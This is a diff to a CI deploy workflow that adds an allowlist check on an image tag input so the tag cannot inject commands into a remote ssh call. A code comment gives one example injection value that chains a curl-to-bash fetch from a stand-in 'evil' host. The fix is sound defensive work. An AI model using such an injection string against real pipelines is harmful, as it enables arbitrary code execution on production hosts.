@@ -73,6 +73,22 @@ jobs:
           SHA: ${{ github.sha }}
         run: |
           if [[ -n "${INPUT_TAG}" ]]; then
+            # Validate before this value goes anywhere near an ssh argument.
+            #
+            # Routing the input through env: protects the RUNNER's shell, but
+            # the deploy step splices the tag into a string that ssh executes
+            # remotely as `bash -c "<string>"`. Unvalidated, a tag of
+            # `v1;curl evil|bash;` is arbitrary code execution on the
+            # production host as the deploy user, reached before deploy.sh's
+            # own argument parser ever sees it.
+            #
+            # This allowlist is a subset of what Docker permits, which is all
+            # we ever produce: a 40-char commit SHA, or `latest`.
+            if [[ ! "${INPUT_TAG}" =~ ^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$ ]]; then
+              echo "ERROR: refusing image tag '${INPUT_TAG}' -- it must match" >&2
+              echo "       ^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$" >&2
+              exit 1
+            fi
             echo "tag=${INPUT_TAG}" >> "$GITHUB_OUTPUT"
           else
             echo "tag=${SHA}" >> "$GITHUB_OUTPUT"
